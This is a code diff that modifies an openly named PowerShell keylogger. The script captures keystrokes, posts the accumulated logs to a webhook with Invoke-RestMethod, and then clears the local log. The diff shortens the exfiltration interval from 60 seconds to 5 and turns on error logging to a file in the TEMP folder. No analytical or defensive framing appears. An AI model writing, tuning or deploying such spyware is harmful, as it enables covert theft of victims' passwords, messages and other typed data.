@@ -37,8 +37,8 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
         while ($true) {
             Start-Sleep -Milliseconds 40
 
-            # check if 60 seconds have passed to send logs
-            if (((Get-Date) - $lastWebhookTime).TotalSeconds -ge 60) {
+            # check if 5 seconds have passed to send logs
+            if (((Get-Date) - $lastWebhookTime).TotalSeconds -ge 5) {
                 try {
                     # read logs
                     $logs = Get-Content -Path $logFile -Raw -Encoding Unicode
@@ -50,13 +50,13 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
                         }
                         # send logs to webhook
                         Invoke-RestMethod -Uri $webhook -Method Post -Body ($Body | ConvertTo-Json) -ContentType 'application/json' | Out-Null
-                        # clear log file after sending (optional)
+                        # clear log file after successful sending
                         Clear-Content -Path $logFile -Force
                     }
                 }
                 catch {
-                    # log error silently (e.g., to a debug file if needed)
-                    # Add-Content -Path "$env:TEMP\keylogger_error.log" -Value $_.Exception.Message
+                    # log error to file for debugging
+                    Add-Content -Path "$env:TEMP\keylogger_error.log" -Value $_.Exception.Message
                 }
                 $lastWebhookTime = Get-Date
             }
@@ -91,7 +91,8 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
             }
         }
         catch {
-            # silent error handling
+            # log error to file for debugging
+            Add-Content -Path "$env:TEMP\keylogger_error.log" -Value $_.Exception.Message
         }
     }
 }
